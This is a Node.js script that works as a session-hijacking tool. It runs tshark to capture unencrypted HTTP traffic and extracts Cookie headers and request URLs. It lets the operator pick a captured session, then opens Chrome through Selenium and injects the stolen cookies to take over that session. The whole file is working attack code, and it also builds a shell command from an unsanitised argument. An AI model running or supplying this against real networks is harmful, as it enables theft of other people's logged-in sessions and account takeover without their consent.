const chromedriver = require('chromedriver');
const webdriver = require('selenium-webdriver');
const prompt = require('prompt');
const { exec } = require('child_process');
const packets = process.argv[2]

exec("tshark -Y http -V -c " + packets + " | grep -e 'Cookie:\\|Full request URI'", (err, data, stderr)  => {
    if (err) {
        // node couldn't execute the command
        console.log("ERROR", err);
    }

    console.log(data);
    console.log(data.toString());    


    const splited = data.split('\n');
    const cookieRegex = /(\s*Cookie:\s)|(\\r\\n$)/gi;
    const urlRegex = /http:.*]/gi;
    const domainRegex = /^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/\n]+)/im;
    const options = []
    let params

    for (var i = 0; i < splited.length; i++) {
        if (splited[i].match(cookieRegex)) params = splited[i].replace(cookieRegex, "").split("; ")
	
        else if (splited[i].match(urlRegex)) {
            const url = splited[i].match(urlRegex)[0]

            options.push({
                url,
                params
            })
        }
    }

    options.map((item, index) => {
        console.log(index + " " + item.url + " => ", item.params)
    });
     console.log(splited.length);
console.log(splited[0]);
    prompt.start();
    prompt.get(['index'], function (err, result) {
	 if (err) {
        	// node couldn't execute the command
       		 console.log("ERROR", err);
  	 }
        const driver = new webdriver.Builder()
            .forBrowser('chrome')
            .build();
        const url = options[result.index].url.match(domainRegex)[0]
        const domain = url.replace(/http:\/\/|https:\/\//gi, "")
        
        driver.get(url);
        options[result.index].params.forEach((param) => {
            const [name, value] = param.split("=")
            driver.manage().addCookie({
                name,
                value,
                domain,
                path: '/',
                secure: false
            }).catch(console.log);
        });
    });
});

